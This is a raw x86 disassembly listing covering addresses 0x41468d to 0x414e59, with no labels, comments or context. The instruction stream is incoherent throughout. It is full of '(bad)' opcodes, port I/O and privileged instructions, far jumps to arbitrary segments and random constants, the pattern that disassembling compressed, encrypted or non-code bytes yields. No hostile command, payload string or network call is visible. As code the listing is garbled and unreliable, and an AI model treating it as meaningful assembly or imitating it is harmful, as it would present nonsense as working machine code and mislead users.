  41468d:	scas   eax,DWORD PTR es:[edi]
  41468e:	mov    bh,BYTE PTR [ebp-0x32a9e194]
  414694:	loop   0x4146f1
  414696:	push   ss
  414697:	mov    dl,0xd7
  414699:	cmp    bh,bl
  41469b:	pop    ecx
  41469c:	shr    BYTE PTR [esi],cl
  41469e:	and    BYTE PTR ss:[eax],0xb7
  4146a2:	fcom   QWORD PTR [eax+edi*4-0x72]
  4146a6:	mov    ch,0xf9
  4146a8:	daa    
  4146a9:	jecxz  0x41469f
  4146ab:	add    DWORD PTR [ecx+0x73fd6fdd],edx
  4146b1:	mov    edi,0x4e4fd12b
  4146b6:	cwde   
  4146b7:	and    al,0x6d
  4146b9:	cmp    eax,0xab9e0c24
  4146be:	adc    BYTE PTR [edi],dl
  4146c0:	ja     0x4146ba
  4146c2:	xor    esp,DWORD PTR [ebx+0x306e91b3]
  4146c8:	and    eax,0xc9bc7fbd
  4146cd:	fabs   
  4146cf:	test   al,0x64
  4146d1:	hlt    
  4146d2:	cdq    
  4146d3:	fist   DWORD PTR [esi+0x40]
  4146d6:	adc    ebp,DWORD PTR [ecx-0x30bcf73]
  4146dc:	mov    al,ds:0x726816ef
  4146e1:	adc    BYTE PTR [esi+ecx*8],al
  4146e4:	in     al,0x5d
  4146e6:	xchg   esp,eax
  4146e7:	data16 rcl BYTE PTR [eax+0xa],cl
  4146eb:	mov    WORD PTR [ebp+0x76fcfada],?
  4146f1:	and    ah,bh
  4146f3:	mov    esi,0xafefd093
  4146f8:	add    DWORD PTR [edx],0xffffff8c
  4146fb:	sub    esp,0x861db92b
  414701:	mov    bl,0x66
  414703:	dec    edx
  414704:	je     0x414715
  414706:	mov    ds:0xfb9e6505,eax
  41470b:	dec    esp
  41470c:	cmp    BYTE PTR [esi-0x5],0x74
  414710:	ret    0x68a6
  414713:	(bad)  
  414714:	cmc    
  414715:	pop    esp
  414716:	fstp   st(5)
  414718:	shl    DWORD PTR [esi],cl
  41471a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41471b:	adc    al,0x66
  41471d:	pop    ecx
  41471e:	cs mov edx,0xf676e4bb
  414724:	xchg   ebx,eax
  414725:	mov    cl,0xc4
  414727:	inc    esi
  414728:	out    0xb3,al
  41472a:	repnz mov ah,dl
  41472d:	adc    al,0xb9
  41472f:	lea    ebx,[edx+0x433a801c]
  414735:	adc    al,0xf2
  414737:	sub    eax,0xd073bd33
  41473c:	push   0xffffffb7
  41473e:	sbb    eax,0x9bcff717
  414743:	out    dx,al
  414744:	(bad)  
  414745:	jecxz  0x4147af
  414747:	lahf   
  414748:	mov    cl,0x81
  41474a:	lock outs dx,BYTE PTR es:[esi]
  41474d:	out    0x36,eax
  41474f:	in     al,0x4f
  414751:	in     eax,0x9e
  414753:	into   
  414754:	int3   
  414755:	pop    ds
  414756:	cmp    al,bl
  414758:	or     al,0x73
  41475a:	(bad)  
  41475b:	enter  0x8e4c,0x1c
  41475f:	fidiv  DWORD PTR ds:0xa98f55fb
  414765:	or     esp,DWORD PTR [ebp-0x8]
  414768:	shl    BYTE PTR ds:0xebd64319,cl
  41476e:	inc    ecx
  41476f:	data16 cmp al,0x51
  414772:	adc    ebx,DWORD PTR [edx+0x35]
  414775:	xor    eax,0x6ef01fa9
  41477a:	mov    eax,0x6752dd96
  41477f:	mov    eax,0xc6603d46
  414784:	push   ebx
  414785:	jnp    0x41473b
  414787:	mov    al,ds:0x56883bc2
  41478c:	ds test eax,0x5aa9e56c
  414792:	xchg   BYTE PTR ds:0x1a029744,dl
  414798:	mov    al,ds:0x8b90593e
  41479d:	push   cs
  41479e:	add    edi,DWORD PTR [esi-0x24]
  4147a1:	jmp    0x2edb2e6c
  4147a6:	mov    DWORD PTR [esi],edx
  4147a8:	es daa 
  4147aa:	jns    0x4147bf
  4147ac:	aas    
  4147ad:	jbe    0x4147d4
  4147af:	mov    ecx,0xed913332
  4147b4:	jns    0x414775
  4147b6:	(bad)  
  4147b7:	pop    es
  4147b8:	push   0x7f
  4147ba:	(bad)
  4147be:	retf   0xa738
  4147c1:	xor    dl,bh
  4147c3:	test   eax,0x6d027e79
  4147c8:	test   eax,0x9680d2d2
  4147cd:	sbb    al,0x76
  4147cf:	stos   BYTE PTR es:[edi],al
  4147d0:	xchg   BYTE PTR [ebx+esi*8+0x28],ah
  4147d4:	enter  0xe79f,0x55
  4147d8:	xchg   esi,eax
  4147d9:	aaa    
  4147da:	iret   
  4147db:	mov    ah,0x25
  4147dd:	or     esi,ecx
  4147df:	and    DWORD PTR [edx-0x6e],eax
  4147e2:	pusha  
  4147e3:	stc    
  4147e4:	xchg   BYTE PTR [esi-0x1b],cl
  4147e7:	mov    dl,0xc7
  4147e9:	inc    edx
  4147ea:	mov    WORD PTR ds:0xeebe7d34,fs
  4147f0:	sbb    al,0xce
  4147f2:	jecxz  0x41478d
  4147f4:	scas   al,BYTE PTR es:[edi]
  4147f5:	popf   
  4147f6:	lea    ebx,[esi-0x7f]
  4147f9:	push   ebx
  4147fa:	pop    ebx
  4147fb:	pop    esp
  4147fc:	std    
  4147fd:	pusha  
  4147fe:	jbe    0x41485c
  414800:	cmp    BYTE PTR [edx],0x4f
  414803:	sub    al,0x76
  414805:	dec    ecx
  414806:	xlat   BYTE PTR ds:[ebx]
  414807:	shl    bh,0x71
  41480a:	in     eax,0x32
  41480c:	push   es
  41480d:	mov    ds:0x950cac51,eax
  414812:	cmp    BYTE PTR [ecx],0x99
  414815:	inc    esi
  414816:	jns    0x4147fd
  414818:	int    0x7c
  41481a:	xor    al,0xc1
  41481c:	add    BYTE PTR [esi],bl
  41481e:	inc    eax
  41481f:	cmp    DWORD PTR [edi],ecx
  414821:	adc    DWORD PTR [ebx],eax
  414823:	ret    0xdea1
  414826:	mov    al,0xb5
  414828:	mov    eax,cs:0x418b5e12
  41482e:	test   al,0x35
  414830:	aam    0xb7
  414832:	mov    dl,0x57
  414834:	test   BYTE PTR [ebp+0x56],bh
  414837:	jno    0x414850
  414839:	dec    ebp
  41483a:	imul   eax,DWORD PTR [esi],0x719462d
  414840:	cwde   
  414841:	cwde   
  414842:	test   al,0x39
  414844:	push   es
  414845:	sub    eax,0x4c87295e
  41484a:	or     eax,0xce21400e
  41484f:	push   eax
  414850:	mov    bh,BYTE PTR ds:0xc9763b70
  414856:	xchg   BYTE PTR [esi+esi*4-0x23266668],ch
  41485d:	xchg   esi,eax
  41485e:	pop    esp
  41485f:	cmp    eax,0xd8c79842
  414864:	dec    edi
  414865:	or     bh,BYTE PTR [eax-0x20c6bcf7]
  41486b:	cmc    
  41486c:	sub    al,0x74
  41486e:	ror    DWORD PTR [edi+0x2c989f37],1
  414874:	push   ebp
  414875:	(bad)  
  414877:	adc    eax,0x2905d91d
  41487c:	mov    bl,0x6f
  41487e:	and    BYTE PTR [edi],dh
  414880:	cdq    
  414881:	inc    edx
  414882:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  414884:	sahf   
  414885:	xor    cl,BYTE PTR [eax+esi*1-0x74]
  414889:	ins    BYTE PTR es:[edi],dx
  41488a:	lods   al,BYTE PTR ds:[esi]
  41488b:	sbb    esp,DWORD PTR [esi+esi*8-0x4f]
  41488f:	wrmsr  
  414891:	retf   0xf54f
  414894:	cdq    
  414895:	pop    edx
  414896:	or     BYTE PTR ds:0x68fb6bee,bl
  41489c:	jecxz  0x4148c5
  41489e:	loop   0x414820
  4148a0:	add    eax,DWORD PTR [ebx+ebx*2]
  4148a3:	pop    edi
  4148a4:	(bad)  
  4148a5:	mov    esi,0xdc060d6b
  4148aa:	unpckhps xmm4,XMMWORD PTR [eax+edx*4+0x35]
  4148af:	addr16 xchg edx,eax
  4148b1:	pusha  
  4148b2:	stos   BYTE PTR es:[edi],al
  4148b3:	jmp    0x49b1:0x9a8ad7af
  4148ba:	leave  
  4148bb:	daa    
  4148bc:	jb     0x4148c9
  4148be:	sbb    eax,0x9220b3f3
  4148c3:	daa    
  4148c4:	rcl    cl,cl
  4148c6:	test   eax,0xa60e1cc8
  4148cb:	add    al,0xb
  4148cd:	inc    esp
  4148ce:	sub    eax,0x2bc648c5
  4148d3:	iret   
  4148d4:	mov    bl,0xde
  4148d6:	aaa    
  4148d7:	add    ebp,ebp
  4148d9:	pop    esi
  4148da:	adc    eax,0xfd843c0a
  4148df:	bound  ebp,QWORD PTR [edi-0x7abd29b7]
  4148e5:	cmp    eax,0x50c500c7
  4148ea:	cmp    ah,BYTE PTR [ecx-0x3e2d67f7]
  4148f0:	sbb    al,0x8c
  4148f2:	xchg   DWORD PTR [edi-0x10d25b1b],ebx
  4148f8:	cdq    
  4148f9:	xor    eax,0xb5778759
  4148fe:	push   0x29bbe02a
  414903:	mov    esp,0x482b196
  414908:	jl     0x41489c
  41490a:	ret    
  41490b:	jbe    0x4148f8
  41490d:	je     0x414961
  41490f:	mov    ebx,0xc3f1a3fe
  414914:	(bad)  
  414915:	jne    0x414922
  414917:	stc    
  414918:	in     al,dx
  414919:	fisub  DWORD PTR [edi-0x11f8bb2e]
  41491f:	or     esp,DWORD PTR [edx-0x16]
  414922:	sub    DWORD PTR [esi-0x36553675],esi
  414928:	mov    dh,0xc9
  41492a:	je     0x414916
  41492c:	mov    ebp,DWORD PTR [eax-0x1e]
  41492f:	enter  0xb97e,0x49
  414933:	mov    ecx,0x6aeed043
  414938:	fdiv   DWORD PTR [esi+0x66]
  41493b:	scas   eax,DWORD PTR es:[edi]
  41493c:	or     edi,DWORD PTR [ecx-0x73e8f119]
  414942:	cmp    DWORD PTR [edx-0x6d6ab22b],0x4b
  414949:	xchg   ebp,eax
  41494a:	mov    ah,0x5
  41494c:	jno    0x4149a1
  41494e:	jae    0x414906
  414950:	repnz aam 0xc6
  414953:	xor    DWORD PTR [eax],edx
  414955:	jp     0x414992
  414957:	lahf   
  414958:	mov    esp,0xf85553a4
  41495d:	fcmovb st,st(5)
  41495f:	push   ds
  414960:	out    dx,al
  414961:	dec    edi
  414962:	push   0xabc9a84c
  414967:	sub    esp,ecx
  414969:	mov    ch,0x6
  41496b:	enter  0xfc62,0xc6
  41496f:	inc    ebp
  414970:	pop    ebx
  414971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414972:	xchg   ebp,eax
  414973:	pop    esi
  414974:	and    BYTE PTR [ebx+0x2da3d264],0xeb
  41497b:	jmp    0x4149f2
  41497d:	sbb    eax,ebp
  41497f:	jae    0x4149bd
  414981:	mov    ds:0x5b9c73e0,eax
  414986:	nop
  414987:	xor    DWORD PTR [ecx],edi
  414989:	inc    edx
  41498a:	scas   al,BYTE PTR es:[edi]
  41498b:	pop    eax
  41498c:	fisttp QWORD PTR [edx-0x5e]
  41498f:	sub    ch,bh
  414991:	xchg   ecx,eax
  414992:	in     eax,0x15
  414994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414995:	xlat   BYTE PTR ds:[ebx]
  414996:	(bad)  
  414998:	mov    DWORD PTR [ebx+0x42],ebx
  41499b:	or     dl,dl
  41499d:	lods   eax,DWORD PTR ds:[esi]
  41499e:	clc    
  41499f:	sti    
  4149a0:	mov    WORD PTR [ecx+0x4e],es
  4149a3:	enter  0x2f1f,0x47
  4149a7:	xchg   esp,eax
  4149a8:	pushf  
  4149a9:	pop    ds
  4149aa:	push   ds
  4149ab:	dec    edx
  4149ac:	sub    ch,BYTE PTR [ebx]
  4149ae:	dec    esp
  4149af:	or     ah,BYTE PTR [esp+ebx*4-0xaaabe77]
  4149b6:	repnz mov bh,0xc3
  4149b9:	cld    
  4149ba:	clc    
  4149bb:	jne    0x41494b
  4149bd:	inc    esp
  4149be:	dec    ebx
  4149bf:	loop   0x4149c2
  4149c1:	bound  edx,QWORD PTR [ecx+edx*8+0x39]
  4149c5:	outs   dx,BYTE PTR ds:[esi]
  4149c6:	mov    al,0xbb
  4149c8:	pop    edi
  4149c9:	lods   eax,DWORD PTR ds:[esi]
  4149ca:	dec    eax
  4149cb:	dec    ebp
  4149cc:	cmp    al,0x7
  4149ce:	inc    ebx
  4149cf:	ss int 0xd
  4149d2:	lods   al,BYTE PTR ds:[esi]
  4149d3:	sti    
  4149d4:	pop    edx
  4149d5:	enter  0xb138,0xc8
  4149d9:	rcr    DWORD PTR [edx],cl
  4149db:	fst    QWORD PTR [ebp+0x4f845a2]
  4149e1:	sbb    BYTE PTR [ebp-0x316ed19d],cl
  4149e7:	jle    0x414a4e
  4149e9:	sub    BYTE PTR [edx+ebx*1-0x5e],cl
  4149ed:	stc    
  4149ee:	fistp  WORD PTR [ecx+eiz*2-0x2a]
  4149f2:	test   al,0xaf
  4149f4:	and    al,0x26
  4149f6:	int    0xe9
  4149f8:	std    
  4149f9:	sub    eax,DWORD PTR [esi]
  4149fb:	cmp    BYTE PTR [esi-0x5a],cl
  4149fe:	cmp    eax,0x1d1fbb2c
  414a03:	mov    esi,0xfe1e4fd5
  414a08:	xchg   ebx,eax
  414a09:	imul   ebx,edi,0x8a044671
  414a0f:	add    ah,ch
  414a11:	push   ss
  414a12:	fwait
  414a13:	jb     0x4149d0
  414a15:	popf   
  414a16:	arpl   WORD PTR [ebx],si
  414a18:	xchg   ebp,ebx
  414a1a:	xchg   edx,eax
  414a1b:	jle    0x4149cb
  414a1d:	stos   BYTE PTR es:[edi],al
  414a1e:	push   edi
  414a1f:	sbb    eax,0x42ae8198
  414a24:	mov    al,0xc7
  414a26:	jns    0x414a67
  414a28:	cs mov ah,0xfe
  414a2b:	test   DWORD PTR [ebx-0x55],edx
  414a2e:	fs jo  0x4149bc
  414a31:	and    al,0x2b
  414a33:	retf   
  414a34:	or     BYTE PTR [edi+0x6453c3f9],bl
  414a3a:	aad    0xdf
  414a3c:	jns    0x414a62
  414a3e:	push   ds
  414a3f:	pop    edi
  414a40:	imul   ebx,DWORD PTR [eax],0xa
  414a43:	push   DWORD PTR ds:0xe517a9c9
  414a49:	test   DWORD PTR [edi+0x54f6fa30],ebp
  414a4f:	fidivr DWORD PTR [esi+esi*1]
  414a52:	xchg   esi,eax
  414a53:	dec    ebx
  414a54:	inc    ebp
  414a55:	jmp    0x414a77
  414a57:	push   esi
  414a58:	mov    ah,0x7
  414a5a:	cmp    esp,edi
  414a5c:	mov    al,0xe9
  414a5e:	sub    BYTE PTR [eax],0xd4
  414a61:	lahf   
  414a62:	imul   ebx,DWORD PTR [eax],0xf2b91cad
  414a68:	pusha  
  414a69:	sub    eax,0xfa1f4ec7
  414a6e:	mov    esi,esi
  414a70:	mov    edi,0xd2ec8bdc
  414a75:	add    al,0x39
  414a77:	ret    0x56a7
  414a7a:	sbb    al,0x63
  414a7c:	iret   
  414a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a7e:	push   esi
  414a7f:	sar    ebp,0xdf
  414a82:	dec    ecx
  414a83:	aad    0x7a
  414a85:	mov    edi,0x273fe15b
  414a8a:	inc    eax
  414a8b:	shl    al,0x80
  414a8e:	cmp    BYTE PTR [edx+0x5a],bh
  414a91:	add    DWORD PTR [ecx-0x49],edx
  414a94:	add    esi,DWORD PTR [edx+0x64]
  414a97:	mov    DWORD PTR [ebx+0x6374c3eb],edx
  414a9d:	jl     0x414b12
  414a9f:	cs and dl,cl
  414aa2:	jg     0x414ae7
  414aa4:	sbb    dh,BYTE PTR [edi-0x75]
  414aa7:	xchg   ecx,eax
  414aa8:	jb     0x414a9d
  414aaa:	sbb    edx,DWORD PTR [ebx+0x2762aa64]
  414ab0:	fwait
  414ab1:	in     al,dx
  414ab2:	mov    eax,0x2bfe2c86
  414ab7:	stos   BYTE PTR es:[edi],al
  414ab8:	or     cl,ah
  414aba:	adc    dl,ah
  414abc:	add    ah,BYTE PTR [eax-0x3e]
  414abf:	ror    DWORD PTR [eax],0xf
  414ac2:	sub    eax,0xe6e76627
  414ac7:	and    esi,DWORD PTR [edx-0x73]
  414aca:	pop    edi
  414acb:	and    ebp,DWORD PTR [ebx-0x2ccd932f]
  414ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ad2:	xchg   edi,eax
  414ad4:	aas    
  414ad5:	ins    DWORD PTR es:[edi],dx
  414ad6:	mov    dl,0xdf
  414ad8:	xchg   eax,ecx
  414ada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414adb:	xor    al,0xe4
  414add:	adc    bl,bl
  414adf:	ins    BYTE PTR es:[edi],dx
  414ae0:	mov    WORD PTR cs:[edi+edi*2+0x45],es
  414ae5:	mov    BYTE PTR [edi-0x4587a660],dl
  414aeb:	jb     0x414ae6
  414aed:	push   es
  414aee:	call   0x586f27bd
  414af3:	repz popf 
  414af5:	pusha  
  414af6:	retf   
  414af7:	or     dh,BYTE PTR [ecx+0x7298f92a]
  414afd:	xor    eax,DWORD PTR [ebp+edi*2-0x36]
  414b01:	(bad)  
  414b02:	jge    0x414b73
  414b04:	xor    eax,edi
  414b06:	test   eax,0x9262066d
  414b0b:	in     al,0x41
  414b0d:	(bad)  
  414b0e:	and    DWORD PTR [ebx-0xe460e8a],esi
  414b14:	lea    ecx,[ecx+0x68e6912d]
  414b1a:	mov    esp,0x3b41410b
  414b1f:	call   0x1995ec3
  414b24:	adc    al,0x38
  414b26:	jp     0x414b4d
  414b28:	int    0x98
  414b2a:	pop    ds
  414b2b:	(bad)
  414b2f:	add    ecx,DWORD PTR [eax-0x50]
  414b32:	sahf   
  414b33:	in     eax,dx
  414b34:	je     0x414b1f
  414b36:	push   ebp
  414b37:	mov    ds:0x355ab71a,al
  414b3c:	nop
  414b3d:	repnz pop ss
  414b3f:	int3   
  414b40:	leave  
  414b41:	or     al,0xcc
  414b43:	jns    0x414bb4
  414b45:	sbb    eax,0x17b6443f
  414b4a:	aaa    
  414b4b:	sub    esp,edi
  414b4d:	push   ebp
  414b4e:	(bad)  
  414b4f:	in     eax,0xba
  414b51:	adc    BYTE PTR [esi],al
  414b53:	cmp    bh,dl
  414b55:	mov    dl,0xe2
  414b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b58:	jne    0x414b38
  414b5a:	(bad)  
  414b5b:	push   ss
  414b5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b5d:	(bad)  
  414b5e:	lods   eax,DWORD PTR ds:[esi]
  414b5f:	pop    ebp
  414b60:	add    BYTE PTR [edi+0x25],0xc1
  414b64:	sub    bh,BYTE PTR [esi]
  414b66:	inc    esi
  414b67:	fwait
  414b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b69:	cmp    al,0x9
  414b6b:	ret    
  414b6c:	pusha  
  414b6d:	sar    cl,cl
  414b6f:	jmp    0x2db7:0xeee7cc12
  414b76:	(bad)  
  414b77:	dec    ebx
  414b78:	rcl    DWORD PTR [edi+esi*2],cl
  414b7b:	shl    DWORD PTR [edx],0x8b
  414b7e:	je     0x414b36
  414b80:	imul   eax,esi,0x25
  414b83:	pusha  
  414b84:	inc    edi
  414b85:	adc    al,0xc2
  414b87:	mov    ds:0xf1574a8e,eax
  414b8c:	int3   
  414b8d:	int3   
  414b8e:	push   esp
  414b8f:	mov    ah,0x40
  414b91:	je     0x414bac
  414b93:	int3   
  414b94:	sbb    ebp,DWORD PTR [ecx-0x67768055]
  414b9a:	cs repnz test edi,0x962d07df
  414ba2:	sub    DWORD PTR [eax+0x5b],ebp
  414ba5:	mov    dh,0x97
  414ba7:	mov    al,0xdb
  414ba9:	pop    ds
  414baa:	sbb    cl,ch
  414bac:	xor    al,0xb8
  414bae:	outs   dx,DWORD PTR ds:[esi]
  414baf:	or     esi,esi
  414bb1:	sub    al,al
  414bb3:	rol    ebp,0xb2
  414bb6:	sti    
  414bb7:	dec    ebx
  414bb8:	mov    BYTE PTR [eax],dl
  414bba:	jecxz  0x414bd4
  414bbc:	enter  0xb15c,0x7a
  414bc0:	mov    ah,0x7a
  414bc2:	aas    
  414bc3:	(bad)  
  414bc4:	out    0x6c,al
  414bc6:	arpl   WORD PTR [ecx],ax
  414bc8:	test   esp,esi
  414bca:	push   edi
  414bcb:	fwait
  414bcc:	mov    bh,0xb8
  414bce:	dec    edx
  414bcf:	fdiv   QWORD PTR [eax]
  414bd1:	and    eax,0x2c5132a8
  414bd6:	out    0xbe,eax
  414bd8:	adc    edi,esp
  414bda:	mov    al,0x17
  414bdc:	jecxz  0x414c0a
  414bde:	mov    esp,DWORD PTR [eax]
  414be0:	or     BYTE PTR [edx],ah
  414be2:	in     al,dx
  414be3:	cmp    ebx,edx
  414be5:	je     0x414c1b
  414be7:	mov    eax,ds:0x69a9d1c1
  414bec:	mov    ds:0xada1635e,eax
  414bf1:	out    dx,eax
  414bf2:	or     eax,0x2d412e61
  414bf7:	hlt    
  414bf8:	sub    eax,0xc6d5e804
  414bfd:	into   
  414bfe:	add    BYTE PTR [esp+eax*2-0x24],bh
  414c02:	cld    
  414c03:	xchg   edi,eax
  414c04:	leave  
  414c05:	pop    ss
  414c06:	imul   edx,DWORD PTR [ecx],0xffffffd6
  414c09:	rcl    DWORD PTR [ebx],cl
  414c0b:	jnp    0x414c05
  414c0d:	pop    ss
  414c0e:	mov    al,0x26
  414c10:	dec    eax
  414c11:	lods   al,BYTE PTR ds:[esi]
  414c12:	sbb    al,0xd5
  414c14:	jp     0x414c46
  414c16:	jns    0x414c37
  414c18:	cdq    
  414c19:	and    DWORD PTR [edi+0x2d],ebp
  414c1c:	sbb    DWORD PTR [ebx-0xa0435d9],esi
  414c22:	push   cs
  414c23:	fldcw  WORD PTR ds:0x831c7922
  414c29:	jb     0x414c0d
  414c2b:	fbstp  TBYTE PTR [edi-0x5c]
  414c2e:	jae    0x414ca6
  414c30:	xchg   edi,eax
  414c31:	lahf   
  414c32:	pushf  
  414c33:	cwde   
  414c34:	adc    al,0x59
  414c36:	pop    edi
  414c37:	dec    esi
  414c39:	jbe    0x414c16
  414c3b:	xchg   ebx,eax
  414c3c:	fs jne 0x414c7d
  414c3f:	mov    ah,0xbd
  414c41:	rcr    ebx,1
  414c43:	ss cld 
  414c45:	addr16 push ss
  414c47:	adc    ebx,eax
  414c49:	test   BYTE PTR [ebx-0x79b81a81],ch
  414c4f:	lds    ebx,FWORD PTR [ecx]
  414c51:	dec    eax
  414c52:	(bad)  
  414c53:	adc    eax,0xcd1b63ca
  414c58:	sbb    eax,DWORD PTR [edi-0x5a222088]
  414c5e:	clc    
  414c5f:	call   0x4fac:0x7cd98956
  414c66:	pushf  
  414c67:	jecxz  0x414cd9
  414c69:	je     0x414bf2
  414c6b:	add    al,0x71
  414c6d:	mov    ebp,0x5e6dd4b7
  414c72:	arpl   WORD PTR [edx+0x7386a82d],cx
  414c78:	dec    esp
  414c79:	(bad)  
  414c7a:	call   0x102c82
  414c7f:	adc    ecx,DWORD PTR [eax+0x18]
  414c82:	je     0x414caf
  414c84:	cmp    al,0xe7
  414c86:	test   eax,0xdb8f54db
  414c8b:	sub    BYTE PTR [edx-0x646defe6],cl
  414c91:	es mov di,0x14b3
  414c96:	stos   BYTE PTR es:[edi],al
  414c97:	jae    0x414cfc
  414c99:	fisub  DWORD PTR [esi-0x5ddafde8]
  414c9f:	dec    ebx
  414ca0:	mov    ecx,0x6cbda055
  414ca5:	dec    eax
  414ca6:	cmp    DWORD PTR [ebp+0x7187e37c],edi
  414cac:	test   BYTE PTR [esi+0x4cfa79f6],0x8d
  414cb3:	fnstenv [ebx]
  414cb5:	xor    cl,ch
  414cb7:	fstp   TBYTE PTR [eax-0x38]
  414cba:	(bad)  
  414cbb:	mov    ch,0x98
  414cbd:	inc    edi
  414cbe:	stc    
  414cbf:	fabs   
  414cc1:	pop    ds
  414cc2:	into   
  414cc3:	clc    
  414cc4:	mov    cl,0x53
  414cc6:	scas   eax,DWORD PTR es:[edi]
  414cc7:	(bad)  
  414cc8:	inc    edi
  414cc9:	or     eax,edx
  414ccb:	or     BYTE PTR [edx],0x9f
  414cce:	xor    DWORD PTR [eax],0xffffffc1
  414cd1:	or     esp,DWORD PTR [edi]
  414cd3:	cdq    
  414cd4:	xor    BYTE PTR [edx+0x291d60c1],bh
  414cda:	dec    edi
  414cdb:	popf   
  414cdc:	sbb    esp,DWORD PTR [ebx-0x3e]
  414cdf:	sub    eax,0xf9fcfe31
  414ce4:	mov    edi,0x3bc63743
  414ce9:	and    BYTE PTR [ecx],bh
  414ceb:	sbb    eax,0x5676cb6d
  414cf0:	adc    cl,ch
  414cf2:	sub    eax,0x3bfa62c7
  414cf7:	xchg   DWORD PTR [edx-0xe8457],edi
  414cfd:	jmp    0x414d50
  414cff:	sbb    ecx,DWORD PTR [eax-0x7f]
  414d02:	jno    0x414d79
  414d04:	jecxz  0x414d1e
  414d06:	mov    al,ds:0x32de7bfe
  414d0b:	pop    ebp
  414d0c:	sbb    eax,0x57c1e7ca
  414d11:	icebp  
  414d12:	dec    esi
  414d13:	jb     0x414d74
  414d15:	dec    eax
  414d16:	arpl   WORD PTR ds:0x9b90b898,cx
  414d1c:	jo     0x414d15
  414d1e:	mov    bl,0xb0
  414d20:	pop    es
  414d21:	imul   BYTE PTR [ecx]
  414d23:	push   esp
  414d24:	mov    edi,0xc827069f
  414d29:	pushf  
  414d2a:	add    esp,ebx
  414d2c:	fwait
  414d2d:	pop    ss
  414d2e:	fcmove st,st(4)
  414d30:	loope  0x414d68
  414d32:	push   eax
  414d33:	add    DWORD PTR [eax],edx
  414d35:	retf   0x7526
  414d38:	fsubr  QWORD PTR [esi-0x33]
  414d3b:	jecxz  0x414ccc
  414d3d:	(bad)  
  414d3e:	jno    0x414d62
  414d40:	xchg   edi,eax
  414d41:	xchg   ecx,eax
  414d42:	xchg   esi,eax
  414d43:	adc    BYTE PTR [ecx],dl
  414d45:	imul   esp,DWORD PTR [ebx-0x33e98467],0xd4f5f724
  414d4f:	ins    DWORD PTR es:[edi],dx
  414d50:	clc    
  414d51:	dec    ebp
  414d52:	add    al,0xe6
  414d54:	mov    ebx,0x4e6be9d
  414d59:	jne    0x414d16
  414d5b:	ror    DWORD PTR [eax-0x37],0xe6
  414d5f:	scas   eax,DWORD PTR es:[edi]
  414d60:	adc    al,0x37
  414d62:	sbb    al,al
  414d64:	fisttp DWORD PTR [esi]
  414d66:	mov    ch,0x4c
  414d68:	mov    eax,0x74531736
  414d6d:	out    dx,al
  414d6e:	int    0xc8
  414d70:	mov    eax,ds
  414d72:	mov    ecx,0xf231cef7
  414d77:	scas   eax,DWORD PTR es:[edi]
  414d78:	int    0x58
  414d7a:	and    DWORD PTR [ebx-0x38],0xe00fc60a
  414d81:	mov    esp,0x20411336
  414d86:	xchg   edi,eax
  414d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d88:	sbb    eax,0xd7c61b21
  414d8d:	retf   
  414d8e:	fwait
  414d8f:	xor    edi,DWORD PTR [edi]
  414d91:	mov    ?,WORD PTR [eax+edi*1-0x757634df]
  414d98:	push   edi
  414d99:	jl     0x414d2b
  414d9b:	scas   al,BYTE PTR es:[edi]
  414d9c:	fdivrp st(2),st
  414d9e:	xchg   edi,esi
  414da0:	aam    0x49
  414da2:	jle    0x414dfa
  414da4:	adc    eax,0x4aed4155
  414da9:	add    ebp,edx
  414dab:	jnp    0x414e2c
  414dad:	sbb    DWORD PTR [ecx],ecx
  414daf:	or     dl,BYTE PTR [ecx+0x78]
  414db2:	xor    eax,DWORD PTR [ebx]
  414db4:	fild   WORD PTR [ebp*1+0x196ee53f]
  414dbb:	stos   DWORD PTR es:[edi],eax
  414dbc:	mov    edx,0x385c24b2
  414dc1:	repz test BYTE PTR fs:[ecx],0x86
  414dc6:	cmp    eax,0xad635d0b
  414dcb:	cmovs  esp,DWORD PTR [eax-0x4f]
  414dcf:	dec    esi
  414dd0:	mov    eax,0xfcd4fb31
  414dd5:	add    al,0x84
  414dd7:	cld    
  414dd8:	sar    BYTE PTR [ebp+0x4],cl
  414ddb:	imul   edx,esi,0xffffffbf
  414dde:	inc    ecx
  414ddf:	dec    ebp
  414de0:	mov    ah,0x9a
  414de2:	mov    ds:0xbdcb4b3e,eax
  414de7:	add    al,0x2
  414de9:	lods   eax,DWORD PTR ds:[esi]
  414dea:	adc    bh,BYTE PTR [ecx-0x242ecc1b]
  414df0:	mov    bl,0x9e
  414df2:	aad    0x22
  414df4:	adc    dh,0x5f
  414df7:	sbb    al,0x94
  414df9:	iret   
  414dfa:	dec    esp
  414dfb:	hlt    
  414dfc:	sbb    BYTE PTR [ebp+ebx*1+0x52d4b512],ch
  414e03:	or     DWORD PTR [ecx],0xa63f704f
  414e09:	repz fld TBYTE PTR [edx+0xc]
  414e0d:	mov    esp,0xaf1b5ae3
  414e12:	and    eax,0x3b2a3e32
  414e17:	jmp    0x414de8
  414e19:	pop    ebx
  414e1a:	add    bh,BYTE PTR [ebp-0x79]
  414e1d:	inc    ebx
  414e1e:	cmp    eax,DWORD PTR [ecx-0x2deb9702]
  414e24:	shl    BYTE PTR [edx+ebp*4-0x5ef21616],1
  414e2b:	xchg   ebx,eax
  414e2c:	jmp    0x61b0:0xcfa9d74c
  414e33:	jns    0x414ea6
  414e35:	lods   eax,DWORD PTR ds:[esi]
  414e36:	pop    ebp
  414e37:	call   0x6760:0x1a1bc1ea
  414e3e:	inc    ecx
  414e3f:	aam    0x65
  414e41:	dec    esp
  414e42:	pop    ebp
  414e43:	lahf   
  414e44:	xchg   ecx,eax
  414e45:	out    dx,al
  414e46:	mov    BYTE PTR [esi-0x56],dl
  414e49:	sub    edi,edx
  414e4b:	leave  
  414e4c:	clc    
  414e4d:	jmp    0x414eb0
  414e4f:	push   ds
  414e50:	pushf  
  414e51:	mov    edx,0xd5adbd06
  414e56:	daa    
  414e57:	mov    cs,WORD PTR [ecx]
  414e59:	mov    eax,edx
